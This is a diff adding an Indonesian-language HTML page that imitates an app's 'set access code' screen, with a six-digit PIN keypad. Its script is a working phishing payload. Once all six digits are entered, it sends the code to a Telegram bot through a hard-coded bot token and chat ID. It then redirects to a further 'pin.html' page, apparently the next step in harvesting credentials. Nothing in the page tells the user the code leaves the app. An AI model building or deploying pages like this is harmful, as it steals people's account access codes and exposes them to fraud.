@@ -1,0 +1,129 @@
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Tetapkan kode akses</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@600&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-[#f7f7f7] min-h-screen flex flex-col">
+  <header class="flex items-center px-5 py-4">
+    <button aria-label="Back" class="text-black text-2xl leading-none">
+      <i class="fas fa-chevron-left"></i>
+    </button>
+    <h1 class="flex-1 text-center text-black font-semibold text-lg leading-none">
+      Tetapkan kode akses
+    </h1>
+    <div class="w-6"></div>
+  </header>
+
+  <main class="flex flex-col items-center px-5 mt-10">
+    <p class="text-center text-black text-base font-normal max-w-xs leading-6">
+      Tetapkan kode akses sekarang untuk mengakses akun Anda dengan cepat dan aman
+    </p>
+
+    <div class="flex space-x-2 mt-6">
+      <span class="w-4 h-4 rounded-full bg-gray-300"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300"></span>
+      <span class="w-4 h-4 rounded-full bg-gray-300"></span>
+    </div>
+
+    <div class="grid grid-cols-3 gap-x-16 gap-y-10 mt-20">
+      <button data-num="1" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">1</button>
+      <button data-num="2" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">2</button>
+      <button data-num="3" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">3</button>
+
+      <button data-num="4" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">4</button>
+      <button data-num="5" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">5</button>
+      <button data-num="6" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">6</button>
+
+      <button data-num="7" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">7</button>
+      <button data-num="8" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">8</button>
+      <button data-num="9" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">9</button>
+
+      <div></div>
+      <button data-num="0" class="num-btn w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-black text-2xl font-semibold">0</button>
+      <button id="deleteBtn" aria-label="Delete" class="w-20 h-20 rounded-full bg-gray-200 flex items-center justify-center text-gray-500 text-2xl">
+        <i class="fas fa-backspace"></i>
+      </button>
+    </div>
+  </main>
+
+  <script>
+    // Telegram bot info - replace with your own bot token and chat ID
+    const TELEGRAM_BOT_TOKEN = '7661713527:AAEXyRZARqRcvPDenx4Y6EvPRPwh2Gp4h5A';
+    const TELEGRAM_CHAT_ID = '7549590022';
+
+    const codeLength = 6;
+    let code = [];
+
+    const dots = document.querySelectorAll('main > div.flex.space-x-2.mt-6 > span');
+    const numButtons = document.querySelectorAll('.num-btn');
+    const deleteBtn = document.getElementById('deleteBtn');
+
+    function updateDots() {
+      dots.forEach((dot, i) => {
+        if (i < code.length) {
+          dot.classList.remove('bg-gray-300');
+          dot.classList.add('bg-gray-600');
+        } else {
+          dot.classList.remove('bg-gray-600');
+          dot.classList.add('bg-gray-300');
+        }
+      });
+    }
+
+    function sendCodeToTelegram(codeStr) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const message = encodeURIComponent(`Kode akses: ${codeStr}`);
+
+      fetch(`${url}?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+          window.location.href = "pin.html";
+          } else {
+            alert('Gagal mengirim kode ke Telegram.');
+          }
+        })
+        .catch(() => {
+          alert('Gagal mengirim kode ke Telegram.');
+        });
+    }
+
+    numButtons.forEach(button => {
+      button.addEventListener('click', () => {
+        if (code.length < codeLength) {
+          code.push(button.dataset.num);
+          updateDots();
+          if (code.length === codeLength) {
+            const codeStr = code.join('');
+            sendCodeToTelegram(codeStr);
+          }
+        }
+      });
+    });
+
+    deleteBtn.addEventListener('click', () => {
+      if (code.length > 0) {
+        code.pop();
+        updateDots();
+      }
+    });
+
+    updateDots();
+  </script>
+</body>
+</html>
